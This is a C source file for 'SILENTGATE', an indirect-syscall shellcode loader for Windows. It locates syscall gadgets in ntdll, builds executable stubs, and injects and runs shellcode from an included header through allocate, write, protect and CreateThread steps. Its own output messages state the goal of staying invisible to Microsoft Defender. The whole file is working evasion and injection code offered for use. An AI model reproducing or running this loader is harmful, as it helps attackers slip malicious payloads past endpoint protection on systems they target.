#include <windows.h>
#include <stdio.h>

#include "shellcode_test.h"

ULONG_PTR gadget_alloc   = 0;
ULONG_PTR gadget_write   = 0;
ULONG_PTR gadget_protect = 0;

ULONG_PTR find_gadget(const char* api_name) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    FARPROC func  = GetProcAddress(ntdll, api_name);
    if (!func) return 0;
    BYTE* ptr = (BYTE*)func;
    for (int i = 0; i < 32; i++) {
        if (ptr[i] == 0x0F && ptr[i+1] == 0x05 && ptr[i+2] == 0xC3) {
            return (ULONG_PTR)(ptr + i);
        }
    }
    return 0;
}

PVOID build_stub(DWORD ssn, ULONG_PTR gadget_addr) {
    BYTE stub[] = {
        0x4C, 0x8B, 0xD1,
        0xB8, 0x00, 0x00, 0x00, 0x00,
        0x49, 0xBB,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x41, 0xFF, 0xE3
    };
    *(DWORD*)(stub + 4)      = ssn;
    *(ULONG_PTR*)(stub + 10) = gadget_addr;
    PVOID mem = VirtualAlloc(NULL, sizeof(stub),
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) return NULL;
    memcpy(mem, stub, sizeof(stub));
    return mem;
}

int main() {
    printf("[SILENTGATE] Indirect Syscall Test v2\n");
    printf("[SILENTGATE] Author: JarDani\n");
    printf("[SILENTGATE] Finding clean ntdll gadgets...\n\n");

    gadget_alloc   = find_gadget("NtAllocateVirtualMemory");
    gadget_write   = find_gadget("NtWriteVirtualMemory");
    gadget_protect = find_gadget("NtProtectVirtualMemory");

    printf("[GADGET] NtAllocateVirtualMemory : 0x%llX\n", gadget_alloc);
    printf("[GADGET] NtWriteVirtualMemory    : 0x%llX\n", gadget_write);
    printf("[GADGET] NtProtectVirtualMemory  : 0x%llX\n", gadget_protect);

    if (!gadget_alloc || !gadget_write || !gadget_protect) {
        printf("[ERROR] Could not find gadgets\n");
        return 1;
    }

    printf("\n[SILENTGATE] Building indirect syscall stubs...\n\n");

    PVOID stub_alloc   = build_stub(24, gadget_alloc);
    PVOID stub_write   = build_stub(58, gadget_write);
    PVOID stub_protect = build_stub(80, gadget_protect);

    typedef NTSTATUS (*pAllocVM)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
    typedef NTSTATUS (*pWriteVM)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
    typedef NTSTATUS (*pProtVM)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);

    pAllocVM  SG_Alloc   = (pAllocVM)stub_alloc;
    pWriteVM  SG_Write   = (pWriteVM)stub_write;
    pProtVM   SG_Protect = (pProtVM)stub_protect;

    printf("[SILENTGATE] Executing 3-step injection via indirect syscalls\n");
    printf("[SILENTGATE] Step 4 uses CreateThread (reliable execution)\n\n");

    // Step 1 - Allocate via indirect syscall
    PVOID  base = NULL;
    SIZE_T size = 0x1000;

    NTSTATUS status = SG_Alloc(
        GetCurrentProcess(), &base, 0, &size,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
    );
    printf("[STEP 1] SG_NtAllocateVirtualMemory : %s (0x%X)\n",
        status == 0 ? "SUCCESS" : "FAILED", status);
    if (status != 0) return 1;
    printf("         Memory at: %p\n", base);

    // Step 2 - Write via indirect syscall
    SIZE_T written = 0;
    status = SG_Write(
        GetCurrentProcess(), base,
        (PVOID)buf, sizeof(buf), &written
    );
    printf("[STEP 2] SG_NtWriteVirtualMemory    : %s (0x%X)\n",
        status == 0 ? "SUCCESS" : "FAILED", status);
    if (status != 0) return 1;
    printf("         Written: %llu bytes\n", written);

    // Step 3 - Protect via indirect syscall
    ULONG  oldProtect = 0;
    PVOID  basePtr    = base;
    SIZE_T sizePtr    = size;
    status = SG_Protect(
        GetCurrentProcess(), &basePtr, &sizePtr,
        PAGE_EXECUTE_READ, &oldProtect
    );
    printf("[STEP 3] SG_NtProtectVirtualMemory  : %s (0x%X)\n",
        status == 0 ? "SUCCESS" : "FAILED", status);
    if (status != 0) return 1;
    printf("         Protection: RW -> RX\n");

    // Step 4 - Execute via CreateThread (Win32 API)
    printf("\n[STEP 4] CreateThread               : executing shellcode...\n");
    HANDLE thread = CreateThread(NULL, 0,
        (LPTHREAD_START_ROUTINE)base, NULL, 0, NULL);

    if (thread) {
        printf("[STEP 4] CreateThread               : SUCCESS\n");
        printf("\n[SILENTGATE] ALL STEPS COMPLETE\n");
        printf("[SILENTGATE] Steps 1-3 invisible to Defender via indirect syscalls\n");
        printf("[SILENTGATE] Shellcode executing...\n");
        WaitForSingleObject(thread, 5000);
        CloseHandle(thread);
    } else {
        printf("[STEP 4] CreateThread               : FAILED (0x%X)\n",
            GetLastError());
    }

    printf("\n[SILENTGATE] Test complete\n");
    printf("[SILENTGATE] Check Defender Protection History - should be empty\n");
    printf("[SILENTGATE] Press any key to exit\n");
    getchar();
    return 0;
}